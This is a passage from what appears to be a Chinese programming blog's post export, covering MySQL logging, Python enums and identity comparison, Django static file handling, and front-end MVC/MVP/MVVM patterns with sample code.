1可以设置变量那样更改，1开启（0关闭），即时生效，不用重启，首选当然是通过这样的方式了。 1234log = /log/mysql_query.log路径set global general_log=1;#这个日志对于操作频繁的库,产生的数据量会很快增长,出于对硬盘的保护,可以设置其他存放路径set global general_log_file=/tmp/general_log.log; 开启方法 2也可以在my.cnf里添加,1开启（0关闭），当然了，这样要重启才能生效。 1general-log = 1 查看 log当执行 sql 语句时，你可以在log 文件中实时看到记录： 1234567891011121314$ tail -f /usr/local/mysql/data/weishi-mac.log/usr/local/mysql/bin/mysqld, Version: 5.7.28 (MySQL Community Server (GPL)). started with:Tcp port: 3306 Unix socket: /tmp/mysql.sockTime Id Command Argument2019-11-17T07:57:40.619929Z 16 Query show databases2019-11-17T07:57:53.393615Z 16 Query SELECT DATABASE()2019-11-17T07:57:53.394086Z 16 Init DB test2019-11-17T07:57:53.395022Z 16 Query show databases2019-11-17T07:57:53.396496Z 16 Query show tables2019-11-17T07:57:53.397506Z 16 Field List tb2019-11-17T07:58:34.496162Z 16 Query SELECT DATABASE()2019-11-17T07:58:34.497292Z 16 Init DB test2019-11-17T07:58:39.336043Z 16 Query show databases2019-11-17T07:59:28.009072Z 16 Query show databases Slow Query LogEnable Slow Query LogGo to mysql conf file (/etc/mysql/my.cnf) and add following lines 123log_slow_queries = /var/log/mysql/mysql-slow.loglong_query_time = 2log-queries-not-using-indexes 查看一下与慢日志相关的全局变量： 12345678910mysql&gt; show global variables like &apos;%slow%&apos;;+---------------------------+-------------------------------------------+| Variable_name | Value |+---------------------------+-------------------------------------------+| log_slow_admin_statements | OFF || log_slow_slave_statements | OFF || slow_launch_time | 2 || slow_query_log | OFF || slow_query_log_file | /usr/local/mysql/data/weishi-mac-slow.log |+---------------------------+-------------------------------------------+ 变量slow_launch_time的值代表着捕获所有执行时间超过2秒的查询。 slow log可以记录没有使用索引的查询。开启log_queries_not_using_indexes，将会记录没有使用索引的查询到slow日志里。 1234567mysql&gt; show global variables like &apos;%not_using%&apos;;+----------------------------------------+-------+| Variable_name | Value |+----------------------------------------+-------+| log_queries_not_using_indexes | OFF || log_throttle_queries_not_using_indexes | 0 |+----------------------------------------+-------+ Bin Log（二进制日志）二进制日志，包含一些事件，这些事件描述了数据库的改动，如建表、数据改动等，主要用于备份恢复、回滚操作等 作用 包含了所有更新了数据或者已经潜在更新了数据(比如没有匹配任何行的一个DELETE) 包含关于每个更新数据库(DML)的语句的执行时间信息 不包含没有修改任何数据的语句，如果需要启用该选项，需要开启通用日志功能 主要目的是尽可能的将数据库恢复到数据库故障点，因为二进制日志包含备份后进行的所有更新 用于在主复制服务器上记录所有将发送给从服务器的语句 启用该选项数据库性能降低1%，但保障数据库完整性，对于重要数据库值得以性能换完整 格式Binlog有3种格式 STATMENT：每一条会修改数据的sql都会记录到master的binlog中，slave在复制的时候sql进程会解析成和原来master端执行多相同的sql再执行。 有点：在statement模式下首先就是解决了row模式的缺点，不需要记录每一行数据的变化减少了binlog日志量，节省了I/O以及存储资源，提高性能。因为他只需要激励在master上所执行的语句的细节一届执行语句时候的上下的信息。 缺点：在statement模式下，由于他是记录的执行语句，所以，为了让这些语句在slave端也能正确执行，那么他还必须记录每条语句在执行的时候的一些相关信息，也就是上下文信息，以保证所有语句在slave端被执行的时候能够得到和在master端执行时候相同的结果。另外就是，由于mysql现在发展比较快，很多的新功能不断的加入，使mysql的复制遇到了不小的挑战，自然复制的时候涉及到越复杂的内容，bug也就越容易出现。在statement中，目前已经发现不少情况会造成Mysql的复制出现问题，主要是修改数据的时候使用了某些特定的函数或者功能的时候会出现，比如：sleep()函数在有些版本中就不能被正确复制，在存储过程中使用了last_insert_id()函数，可能会使slave和master上得到不一致的id等等。 ROW：日志中会记录成每一行数据被修改的形式，然后在slave端再对相同的数据进行修改，只记录要修改的数据，只有value，不会有sql多表关联的情况。 优点：在row模式下，bin-log中可以不记录执行的sql语句的上下文相关的信息，仅仅只需要记录那一条记录被修改了，修改成什么样了，所以row的日志内容会非常清楚的记录下每一行数据修改的细节，非常容易理解。而且不会出现某些特定情况下的存储过程和function，以及trigger的调用和出发无法被正确复制问题。 缺点：在row模式下，所有的执行的语句当记录到日志中的时候，都将以每行记录的修改来记录，这样可能会产生大量的日志内容。 MIXED：MySQL 会根据执行的每一条具体的 SQL 语句来区分对待记录的日志形式，也就是在 statement 和 row 之间选择一种 配置查看MySQL中二进制日志的配置情况：show variables like “%log_bin%”; 1234567891011mysql&gt; show variables like \"%log_bin%\";+---------------------------------+-------+| Variable_name | Value |+---------------------------------+-------+| log_bin | OFF || log_bin_basename | || log_bin_index | || log_bin_trust_function_creators | OFF || log_bin_use_v1_row_events | OFF || sql_log_bin | ON |+---------------------------------+-------+ log_bin : 用于设定是否启用二进制日志, 由此看是未开启。 配置文件仍然是在 /etc/my.cnf 中， 修改/etc/my.cnf， 增加日志文件目录： 1log_bin = /tmp/mysql-bin.log 事务日志事务日志（InnoDB特有的日志）可以帮助提高事务的效率。使用事务日志，存储引擎在修改表的数据时只需要修改其内存拷贝，再把改修改行为记录到持久在硬盘上的事务日志中，而不用每次都将修改的数据本身持久到磁盘。事务日志采用追加的方式，因此写日志的操作是磁盘上一小块区域内的顺序I/O，而不像随机I/O需要在磁盘的多个地方移动磁头，所以采用事务日志的方式相对来说要快得多。事务日志持久以后，内存中被修改的数据在后台可以慢慢的刷回到磁盘。目前大多数的存储引擎都是这样实现的，我们通常称之为预写式日志，修改数据需要写两次磁盘。 如果数据的修改已经记录到事务日志并持久化，但数据本身还没有写回磁盘，此时系统崩溃，存储引擎在重启时能够自动恢复这部分修改的数据。具有的恢复方式则视存储引擎而定。 Reference https://dev.mysql.com/doc/refman/8.0/en/query-log.html https://dev.mysql.com/doc/refman/5.7/en/log-destinations.html https://blog.51cto.com/arthur376/1853924 https://blog.csdn.net/yumushui/article/details/40820763 https://stackoverflow.com/questions/5441972/how-to-see-log-files-in-mysql https://blog.51cto.com/pangge/1319304 https://www.jianshu.com/p/db19a1d384bc","comments":true,"categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"}]},{"title":"【Python】枚举","date":"2019-11-17T05:24:04.000Z","path":"2019/11/17/【Python】枚举/","text":"枚举（Enumeration）当我们需要定义常量时，一个办法是用大写变量通过整数来定义，例如月份： 123456JAN = 1FEB = 2MAR = 3...NOV = 11DEC = 12 好处是简单，缺点是类型是int，并且仍然是变量。 更好的方法是为这样的枚举类型定义一个class类型，然后，每个常量都是class的一个唯一实例。Python提供了Enum类来实现这个功能： 123from enum import EnumMonth = Enum('Month', ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec')) 这样我们就获得了Month类型的枚举类，可以直接使用Month.Jan来引用一个常量，或者枚举它的所有成员： 12for name, member in Month.__members__.items(): print(name, '=&gt;', member, ',', member.value) 枚举类如果需要更精确地控制枚举类型，可以从Enum派生出自定义类： 1234567891011from enum import Enum, unique@uniqueclass Weekday(Enum): Sun = 0 # Sun的value被设定为0 Mon = 1 Tue = 2 Wed = 3 Thu = 4 Fri = 5 Sat = 6 @unique装饰器可以帮助我们检查保证没有重复值。 访问这些枚举类型可以有若干种方法： 12345678910111213141516171819202122232425262728293031&gt;&gt;&gt; day1 = Weekday.Mon&gt;&gt;&gt; print(day1)Weekday.Mon&gt;&gt;&gt; print(Weekday.Tue)Weekday.Tue&gt;&gt;&gt; print(Weekday['Tue'])Weekday.Tue&gt;&gt;&gt; print(Weekday.Tue.value)2&gt;&gt;&gt; print(day1 == Weekday.Mon)True&gt;&gt;&gt; print(day1 == Weekday.Tue)False&gt;&gt;&gt; print(Weekday(1))Weekday.Mon&gt;&gt;&gt; print(day1 == Weekday(1))True&gt;&gt;&gt; Weekday(7)Traceback (most recent call last): ...ValueError: 7 is not a valid Weekday&gt;&gt;&gt; for name, member in Weekday.__members__.items():... print(name, '=&gt;', member)...Sun =&gt; Weekday.SunMon =&gt; Weekday.MonTue =&gt; Weekday.TueWed =&gt; Weekday.WedThu =&gt; Weekday.ThuFri =&gt; Weekday.FriSat =&gt; Weekday.Sat 可见，既可以用成员名称引用枚举常量，又可以直接根据value的值获得枚举常量。 Reference https://www.liaoxuefeng.com/wiki/1016959663602400/1017595944503424","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】is 和 ==","date":"2019-11-16T05:58:04.000Z","path":"2019/11/16/【Python】is-和/","text":"is和==都是对对象进行比较判断作用的，但对对象比较判断的内容并不相同。下面来看看具体区别在哪? is比较的是两个对象的id值是否相等，也就是比较两个对象是否为同一个实例对象，是否指向同一个内存地址。 ==比较的是两个对象的内容是否相等，默认会调用对象的eq()方法。 要理解Python中is和==的区别，首先要理解Python对象的三个要素: 要素 说明 获取方式 id 身份标识，基本就是内存地址，用来唯一标识一个对象 id(obj) type 数据类型 type(obj) value 值 :—–: is和==区别 标识 名称 判断方法 is 同一性运算符 id == 比较运算符 value ====是python标准操作符中的比较操作符，用来比较判断两个对象的value(值)是否相等。 代码1： 1234567891011&gt;&gt;&gt; a = [1, 2, 3]&gt;&gt;&gt; b = a&gt;&gt;&gt; b is a True&gt;&gt;&gt; b == aTrue&gt;&gt;&gt; b = a[:]&gt;&gt;&gt; b is aFalse&gt;&gt;&gt; b == aTrue 解释一下为什么？is也被叫做同一性运算符，也就是id是否相同。看下面代码， a和b变量的id不同， 所以b==a是True， b is a 是False. 代码2： 12345&gt;&gt;&gt; id(a)4364243328&gt;&gt;&gt; &gt;&gt;&gt; id(b)4364202696 数字类型代码3： 1234567891011121314&gt;&gt;&gt; a = 256&gt;&gt;&gt; b = 256&gt;&gt;&gt; a is bTrue&gt;&gt;&gt; a == bTrue&gt;&gt;&gt;&gt;&gt;&gt; a = 1000&gt;&gt;&gt; b = 10**3&gt;&gt;&gt; a == bTrue&gt;&gt;&gt; a is bFalse&gt;&gt;&gt; 结论：数字类型不完全相同。 为什么256时相同， 而1000时不同？ 因为出于对性能的考虑，Python内部做了很多的优化工作，对于整数对象，Python把一些频繁使用的整数对象缓存起来，保存到一个叫small_ints的链表中，在Python的整个生命周期内，任何需要引用这些整数对象的地方，都不再重新创建新的对象，而是直接引用缓存中的对象。Python把这些可能频繁使用的整数对象规定在范围[-5, 256]之间的小对象放在small_ints中，但凡是需要用些小整数时，就从这里面取，不再去临时创建新的对象。 字符串类型代码4： 1234567891011121314c = 'aaa'd = 'aaa'print(c is d) # Trueprint(c == d) # Truee = \"a\" + \"aa\"print(e is d) # Trueprint(e == d) # Truef = \"aa\"g = \"a\" + fprint(g is d) # Falseprint(g == d) # True 这样的结果表现其实和 Java 完全相同，即 is 就是 Java 中的 ==（比较内存地址），==就是 Java 中的 equals()。 对于e = &quot;a&quot; + &quot;aa&quot;，其实在编译时，就会自动被优化成 e = &quot;aaa&quot;。 类类型代码5： 123456789101112131415161718192021222324252627&gt;&gt;&gt; a = (1,2,3) #a和b为元组类型&gt;&gt;&gt; b = (1,2,3)&gt;&gt;&gt; a is bFalse&gt;&gt;&gt; a == bTrue&gt;&gt;&gt; a = [1,2,3] #a和b为list类型&gt;&gt;&gt; b = [1,2,3]&gt;&gt;&gt; a is bFalse&gt;&gt;&gt; a == bTrue&gt;&gt;&gt; a = &#123;'python':100,'com':1&#125; #a和b为dict类型&gt;&gt;&gt; b = &#123;'python':100,'com':1&#125;&gt;&gt;&gt; a is bFalse&gt;&gt;&gt; a == bTrue&gt;&gt;&gt; a = set([1,2,3])#a和b为set类型&gt;&gt;&gt; b = set([1,2,3])&gt;&gt;&gt; a is bFalse&gt;&gt;&gt; a == bTrue 当我们自定义自己的类时，可以重新它的__eq__方法，来自定义当调用 == 时的行为： 1234567891011&gt;&gt;&gt; class Foo(object): def __eq__(self, other): return True&gt;&gt;&gt; f = Foo()&gt;&gt;&gt; f == 1True&gt;&gt;&gt; f == NoneTrue&gt;&gt;&gt; f is NoneFalse Reference https://juejin.im/entry/5a3b62446fb9a0451f311b5c https://www.jianshu.com/p/2a4554b1d2ee","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Django】Django 静态资源和 HTML 文件管理","date":"2019-11-13T03:53:45.000Z","path":"2019/11/13/【Django】Django-静态文件/","text":"Backgrounddjango.contrib.staticfilesdjango.contrib.staticfiles是django1.3新增的一个app来帮助开发者管理静态文件（js，css等）。 在我使用的 Django 1.6.11版本中，默认已安装并加载了 staticfiles App， 123456789INSTALLED_APPS = [ # 'django.contrib.admin', # 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'core',] STATIC_URL使用 STATIC_URL 管理静态文件（ images, JavaScript, CSS）在项目的 setting.py 中声明： 1STATIC_URL = '/static/' 新建项目myproject： 1$ django-admin.py startproject TestDjango 在项目中新建一个app名叫hello“： 1234$ cd TestDjango$ python manage.py startapp hello$ lshello TestDjango manage.py 在项目的settings.py文件中INSTALLED_APPS中配置hello app： 1234INSTALLED_APPS = ( ... 'hello',) 在hello app下建一个static目录用来存放静态文件： 1234$ cd hello$ mkdir static$ ls__init__.py models.py static tests.py views.py 然后在static目录新建一个test.js的静态文件： 12345$ cd static/$ lstest.js$ cat test.jsalert(\"load test.js successfully\"); 当前项目结构： 12345678tree.├── TestDjango├── hello│ ├── static│ │ └── test.js│ ├── ...└── ... 运行项目： 1$ python manage.py runserver 0.0.0.0:8001 通过url访问： 这里很奇怪的是，这个 static 文件夹是位于你的 Django App 文件夹根目录中的（而不是你的 Django Project 文件夹根目录中），而你指定的明明是 STATIC_URL = &#39;/static/&#39;。 这其实是因为使用 STATIC_URL 定义的方式，静态资源文件夹只能被一个 Django App 使用， 在 HTML 中嵌入静态资源在 settings.py中指定 templates： 12345678910111213141516TEMPLATES = [ &#123; 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [os.path.join(BASE_DIR, 'templates')] , 'APP_DIRS': True, 'OPTIONS': &#123; 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], &#125;, &#125;,] 在项目的根目录下创建一个 templates 文件夹文件夹： 1$ mkdir templates 在 templates 文件夹中定义一个 a.html： 123456789101112&#123;% load static %&#125;&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;a&lt;/title&gt; &lt;link href=\"&#123;% static 'test.js' %&#125;\" rel=\"stylesheet\"&gt;&lt;/head&gt;&lt;body&gt;a's body&lt;/body&gt;&lt;/html&gt; 此时的文件结构： 12345678910$ tree├── TestDjango│ ├── ...├── hello│ ├── static│ │ └── test.js│ ├── ...├── templates ├── a.html└── ... 在 hello App 的 views.py 中定义一个 view： 12def a(request): return render(request, 'a.html', locals()) 在项目下的 urls.py 中定义路由： 12345678from django.conf.urls import url# from django.contrib import adminfrom hello import viewsurlpatterns = [ # url(r'^admin/', admin.site.urls), url(r'^a/',views.a)] 当访问 http://127.0.0.1:8001/a 时： STATICFILES_DIRS这其实是因为使用 STATIC_URL 定义的方式，静态资源文件夹只能被一个 Django App 使用。 如果当我们的 Django Project 中，有多个 Django App 时，使用 STATICFILES_DIRS 则可以更科学的管理静态资源。 Format example： 12345STATICFILES_DIRS = [ \"/home/special.polls.com/polls/static\", \"/home/polls.com/polls/static\", \"/opt/webfiles/common\",] Note that these paths should use Unix-style forward slashes, even on Windows (e.g. &quot;C:/Users/user/mysite/extra_static_content&quot;). 使用 STATICFILES_DIRS 管理静态资源在 settings.py 中定义： 1234STATIC_URL = '/static/'STATICFILES_DIRS = [ os.path.join(BASE_DIR, \"static\"),] 注意： 不能不声明 STATIC_URL，而只声明 STATICFILES_DIRS，否则会有错误：django.core.exceptions.ImproperlyConfigured: You&#39;re using the staticfiles app without having set the required STATIC_URL setting.。 不能进行STATIC_URL = &#39;/&#39; 的声明，否则路由机制会出现问题。 在项目中新建一个app名叫hello2： 1234$ cd TestDjango$ python manage.py startapp hello2$ lsTestDjango hello hello2 manage.py templates 在hello2 的 views.py 中增加： 12345def b(request): # return HttpResponse(\"return this string\") context = &#123;&#125; context['hello'] = 'Hello World!' return render(request, 'b.html', context) 在 urls.py 中修改整个 Django Project 的路由规则为： 123456789from django.conf.urls import urlfrom hello.views import afrom hello2.views import burlpatterns = [ url(r'^a/$', a), url(r'^b/$', b),] 目录结构为： 12345678910111213141516$ tree /Users/wei.shi/Downloads/TestDjango/Users/wei.shi/Downloads/TestDjango├── TestDjango│ ├── ...├── hello│ ├── views.py│ └── ...├── hello2│ ├── views.py│ └── ...├── static│ └── test.js├── templates ├── a.html └── b.html└── ... 最终，无论是访问 http://127.0.0.1:8001/a/ 还是 http://127.0.0.1:8001/b/，一切都正常： 存疑然而发现一个神奇的地方，当在 settings.py 中设置为： 1234STATIC_URL = '/aabbccdd/'STATICFILES_DIRS = [ os.path.join(BASE_DIR, \"static\"),] 在 HTML 页面中，仍然采用和上面一样的方法来加载静态资源，即： 123&#123;% load static %&#125;...&lt;link href=\"&#123;% static 'test.js' %&#125;\" rel=\"stylesheet\"&gt; 虽然请求 http://127.0.0.1:8001/a/ 时，仍能正常获取到静态资源，但是在Chrome DevTools 中，看到的请求 URL 竟然是 http://127.0.0.1:8001/aabbccdd/test.js： Prefixes (optional)In case you want to refer to files in one of the locations with an additional namespace, you can optionally provide a prefix as (prefix, path) tuples, e.g.: 1234STATICFILES_DIRS = [ # ... (&quot;downloads&quot;, &quot;/opt/webfiles/stats&quot;),] For example, assuming you have STATIC_URL set to &#39;/static/&#39;, the collectstatic management command would collect the “stats” files in a &#39;downloads&#39; subdirectory of STATIC_ROOT. This would allow you to refer to the local file /opt/webfiles/stats/polls_20101022.tar.gz with /static/downloads/polls_20101022.tar.gz in your templates, e.g.: 1&lt;a href=&quot;&#123;% static &quot;downloads/polls_20101022.tar.gz&quot; %&#125;&quot;&gt; 部署静态文件（Deploy Static Files）django.contrib.staticfiles provides a convenience management command for gathering static files in a single directory so you can serve them easily. Most larger Django sites use a separate Web server – i.e., one that’s not also running Django – for serving static files. This server often runs a different type of web server – faster but less full-featured. Some common choices are: Nginx A stripped-down version of Apache 在 Django Project 的 settings.py 中设置： 1STATIC_ROOT = \"/var/www/example.com/static/\" 执行： 1$ python manage.py collectstatic 此后，所有的静态资源都会被拷贝到 /var/www/example.com/static/下。 我们可以根据具体项目中的情况，将这些静态资源拷贝到 CDN 或者交由 Nginx 这样的 Web server 帮来我们处理静态资源的请求。 如果需要部署到 CDN，则可以在 Django Project 的 settings.py 中设置： 1STATIC_URL = 'https://your.cdn./' 这样，所有的静态文件的 URL 前缀都会自动变成你这个的这个 CDN 的地址： Reference https://docs.djangoproject.com/en/1.11/howto/static-files/ https://docs.djangoproject.com/en/1.11/ref/settings/#std:setting-STATICFILES_STORAGE https://docs.djangoproject.com/en/1.11/howto/static-files/deployment/ https://www.cnblogs.com/starof/p/4682812.html","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【Architectural Pattern】前端框架中的 MVC、MVP 和 MVVM","date":"2019-11-10T13:57:29.000Z","path":"2019/11/10/【Architectural-Pattern】前端开发中的-MVC、MVP-和-MVVM/","text":"1 原始的MVC （Model - View - Controller）MVC （Model - View - Controller）架构是一种当前非常流行的架构模式（Architectural Pattern），被广泛使用于传统的桌面GUI（Graphical user interface）、Web应用和手机移动应用中。 1979年，MVC的概念被 Trygve Reenskaug 在 Smalltalk 中提出。这种架构模式，极大地降低了GUI应用程序的管理难度，而后被大量用于构建桌面和服务器端应用程序； 从1996年后，MVC逐渐被广泛应用； 2002年，基于Java的Web应用框架Spring引入了MVC的概念； 2005年，基于Python的Django和基于Ruby的Rails也引入了MVC的概念。 在最初以Smalltalk实现中MVC概念中，MVC是由组合模式（Composite Pattern）、策略模式（Strategy Pattern）和观察者模式（Observer Pattern）三种设计模式组合而成的。 如图，实线代表方法调用，虚线代表事件通知（Event notification），通过观察者模式实现。 在前端框架的 MVC 中， View 代表UI界面（或者说 DOM），它关注于数据的显示和与用户的交互，Controller 中包含了前端页面的业务逻辑，而 Model中通常会包含 call backend APIs 的逻辑。 用户的输入操作本质上是传给了 View 层，而 View 会将这个输入操作传递给 Controller。此后可能会有两种情况： Controller 能自己处理，而不需要调用 Model 时，此时，Controller 会直接调用 View 的一个特定的函数。比如，这个用户的操作只需要触发网页上一个button 的隐藏（可以通过修改特定 DOM 元素的 style 来实现隐藏）。 Controller 不能自己处理，此时，就需要调用 Model。在 Model 中，通常会调用backend APIs。比如，显示一个订单的详细内容。 Demo这里有一个可以对数值进行加减操作的组件：上面显示数值，两个按钮可以对数值进行加减操作（这个操作需要实时地更新到 backend 的数据库中），操作后的数值会更新显示。 ModelModel层用来存储业务的数据，一旦数据发生变化，Model将会通过观察者模式，通知有关的View。 1234567891011121314151617181920212223242526272829303132myapp.Model = function() &#123; var val = 0; this.add = function(v) &#123; // 这里省略了调用后端 API 以将这个值更新到 DB 中的逻辑 if (val &lt; 100) val += v; &#125;; this.sub = function(v) &#123; // 这里省略了调用后端 API 以将这个值更新到 DB 中的逻辑 if (val &gt; 0) val -= v; &#125;; this.getVal = function() &#123; // 这里省略了调用后端 API 以读取这个值的逻辑 return val; &#125;; ／* 观察者模式 *／ var self = this, views = []; this.register = function(view) &#123; views.push(view); &#125;; this.notify = function() &#123; for(var i = 0; i &lt; views.length; i++) &#123; views[i].render(self); &#125; &#125;;&#125;; Model和View之间使用了观察者模式，因此View事先需要在此Model上注册，以观察Model。最终，当在 Model 中发生事件（数据变化）时，View 能得到通知。 ViewView 和 Controller 之间使用了策略模式，这里View引入了Controller的实例来实现特定的响应策略，比如这个栗子中按钮的 click 事件： 1234567891011121314myapp.View = function(controller) &#123; var $num = $('#num'), $incBtn = $('#increase'), $decBtn = $('#decrease'); // 更新数据到页面中 this.render = function(model) &#123; $num.text(model.getVal() + 'rmb'); &#125;; /* 绑定事件 */ $incBtn.click(controller.increase); $decBtn.click(controller.decrease);&#125;; 如果要实现不同的响应的策略只要用不同的Controller实例替换即可。 你会发现，用户的输入操作本质上是传给了View 层，只是 View 将这个操作直接传给了Controller。 ControllerController 是 Model 和 View 之间的纽带，MVC将响应机制封装在controller对象中，当用户和你的应用产生交互时，控制器中的事件触发器就开始工作了。 12345678910111213141516171819202122232425myapp.Controller = function() &#123; var model = null, view = null; this.init = function() &#123; /* 初始化Model和View */ model = new myapp.Model(); view = new myapp.View(this); /* View向Model注册，当Model更新就会去通知View啦 */ model.register(view); model.notify(); &#125;; /* 调用Model以更新数值，且 Model 通知 View 以更新数据 */ this.increase = function() &#123; model.add(1); model.notify(); &#125;; this.decrease = function() &#123; model.sub(1); model.notify(); &#125;;&#125;; 启动 MVC这里我们实例化View并向对应的Model实例注册，当Model发生变化时就去通知View做更新，这里用到了观察者模式。 当我们执行应用的时候，使用Controller做初始化： 1234(function() &#123; var controller = new myapp.Controller(); controller.init();&#125;)(); 不足View承接了部分Controller的功能，负责接收用户输入（但并不负责处理，而是无脑地传给 Controller）。 事实上，前端的View已经具备了独立处理用户事件的能力，如果每个事件都要流经Controller，势必增加复杂性。 同时，View 应该委托Controller来调用Model（这样 Model 对于 View 来说就是透明的），而不是Model 与 View 之间存在耦合。 你会发现，View 和 Controller 是一对一的关系。而事实上，前端的View其实已经具备了独立处理用户事件的能力，当每个事件都需要流经Controller时，Controller会变得十分臃肿。 在Backbone中，Backbone.View和Backbone.Router一起承担了Controller的责任。这就为MVC中controller的衍变埋下了伏笔。这其实是因为在原始的 MVC 中 View 和 Controller 一般是一一对应的，捆绑起来表示一个组件，View 与 Controller 间的过于紧密的连接让Controller的复用性成了问题，如果想多个View共用一个Controller该怎么办呢？这里有一个解决方案：MVP（Model-View-Presenter）。 2 优化后的MVC - MVP（Model-View-Presenter） MVP（Model-View-Presenter）是MVC模式的改良，由IBM的子公司Taligent提出。和MVC的相同之处在于：Controller/Presenter负责业务逻辑，Model管理数据，View负责显示。 在原始的 MVC 里，View 是可以直接访问 Model 的，但MVP中，View并不能直接访问Model，而是 Presenter 给 View 提供接口，通过Presenter去更新Model，再通过观察者模式更新View。 与MVC相比，MVP模式通过解耦View和Model，完全分离 View 和 Model 使职责划分更加清晰；由于View不依赖Model，可以将View抽离出来做成组件，它只需要提供一系列接口提供给上层操作。 而且，MVP 还解决了 Controller - View的捆绑关系，将进行改造，使View不仅拥有UI组件的结构，还拥有处理用户事件的能力，这样就能将 Controller 独立出来。为了对用户事件进行统一管理，View只负责将用户产生的事件传递给Controller，由Controller来统一处理，这样的好处是多个View可共用同一个Controller。此时的Controller也由组件级别上升到了应用级别。 DemoModel123456789101112131415myapp.Model = function() &#123; var val = 0; this.add = function(v) &#123; if (val &lt; 100) val += v; &#125;; this.sub = function(v) &#123; if (val &gt; 0) val -= v; &#125;; this.getVal = function() &#123; return val; &#125;;&#125;; Model层依然是主要与业务相关的数据和对应处理数据的方法。 View12345678910111213141516myapp.View = function() &#123; var $num = $('#num'), $incBtn = $('#increase'), $decBtn = $('#decrease'); this.render = function(model) &#123; $num.text(model.getVal() + 'rmb'); &#125;; this.init = function() &#123; var presenter = new myapp.Presenter(this); $incBtn.click(presenter.increase); $decBtn.click(presenter.decrease); &#125;;&#125;; MVP定义了Presenter和View之间的接口，用户对View的操作都转移到了Presenter。比如这里可以让View暴露setter接口以便Presenter调用，待Presenter通知Model更新后，Presenter调用View提供的接口更新视图。 Presenter12345678910111213141516myapp.Presenter = function(view) &#123; var _model = new myapp.Model(); var _view = view; _view.render(_model); this.increase = function() &#123; _model.add(1); _view.render(_model); &#125;; this.decrease = function() &#123; _model.sub(1); _view.render(_model); &#125;;&#125;; Presenter作为View和Model之间的“中间人”，除了基本的业务逻辑外，还有大量代码需要对从View到Model和从Model到View的数据进行“手动同步”，这样Presenter显得很重，维护起来会比较困难。而且由于没有数据绑定，如果Presenter对视图渲染的需求增多，它不得不过多关注特定的视图，一旦视图需求发生改变，Presenter也需要改动。 运行程序时，以View为入口： 1234(function() &#123; var view = new myapp.View(); view.init();&#125;)(); MVVMMVVM（Model-View-ViewModel）最初是由微软在使用Windows Presentation Foundation和SilverLight时定义的，2005年John Grossman在一篇关于Avalon（WPF 的代号）的博客文章中正式宣布了它的存在。 WPF Demo如果你用过Visual Studio, 新建一个WPF Application，然后在“设计”中拖进去一个控件、双击后在“代码”中写事件处理函数、或者绑定数据源。就对这个MVVM有点感觉了。比如VS自动生成的如下代码： 123456789101112&lt;GroupBox Header=\"绑定对象\"&gt; &lt;StackPanel Orientation=\"Horizontal\" Name=\"stackPanel1\"&gt; &lt;TextBlock Text=\"学号:\"/&gt; &lt;TextBlock Text=\"&#123;Binding Path=StudentID&#125;\"/&gt; &lt;TextBlock Text=\"姓名:\"/&gt; &lt;TextBlock Text=\"&#123;Binding Path=Name&#125;\"/&gt; &lt;TextBlock Text=\"入学日期:\"/&gt; &lt;TextBlock Text=\"&#123;Binding Path=EntryDate, StringFormat=yyyy-MM-dd&#125;\"/&gt; &lt;TextBlock Text=\"学分:\"/&gt; &lt;TextBlock Text=\"&#123;Binding Path=Credit&#125;\"/&gt; &lt;/StackPanel&gt;&lt;/GroupBox&gt; 123456stackPanel1.DataContext = new Student() &#123; StudentID=20130501, Name=&quot;张三&quot;, EntryDate=DateTime.Parse(&quot;2013-09-01&quot;), Credit=0.0&#125;; 其中最重要的特性之一就是数据绑定（Data-binding）。没有前后端分离，一个开发人员全搞定，一只手抓业务逻辑、一只手抓数据访问，顺带手拖放几个UI控件，绑定数据源到某个对象或某张表，一步到位。 MVVM 首先，view和model是不知道彼此存在的，同MVP一样，将view和model清晰地分离开来。 与 MVP 不同的是，MVVM把View和Model的同步逻辑自动化了。以前Presenter负责的View和Model同步不再手动地进行操作，而是交给框架所提供的数据绑定功能进行负责，只需要告诉它View显示的数据对应的是Model哪一部分即可。 其次，view是对viewmodel的外在显示，与viewmodel保持同步，viewmodel对象可以看作是view的上下文。view绑定到viewmodel的属性上，如果viewmodel中的属性值变化了，这些新值通过数据绑定会自动传递给view。反过来viewmodel会暴露model中的数据和特定状态给view。 所以，view不知道model的存在，viewmodel和model也觉察不到view。事实上，model也完全忽略viewmodel和view的存在。这是一个非常松散耦合的设计。 这里我们使用Vue来完成这个栗子。 Vue.js DemoModel在MVVM中，我们可以把Model称为数据层，因为它仅仅关注数据本身，不关心任何行为（格式化数据由View的负责），这里可以把它理解为一个类似 JSON 的数据对象。 123var data = &#123; val: 0&#125;; View和MVC/MVP不同的是，MVVM中的View通过使用模板语法来声明式的将数据渲染进DOM，当ViewModel对Model进行更新的时候，会通过数据绑定更新到View。写法如下： 123456789&lt;div id=\"myapp\"&gt; &lt;div&gt; &lt;span&gt;&#123;&#123; val &#125;&#125;rmb&lt;/span&gt; &lt;/div&gt; &lt;div&gt; &lt;button v-on:click=\"sub(1)\"&gt;-&lt;/button&gt; &lt;button v-on:click=\"add(1)\"&gt;+&lt;/button&gt; &lt;/div&gt;&lt;/div&gt; ViewModelViewModel大致上就是MVC的Controller和MVP的Presenter了，也是整个模式的重点，业务逻辑也主要集中在这里，其中的一大核心就是数据绑定，后面将会讲到。 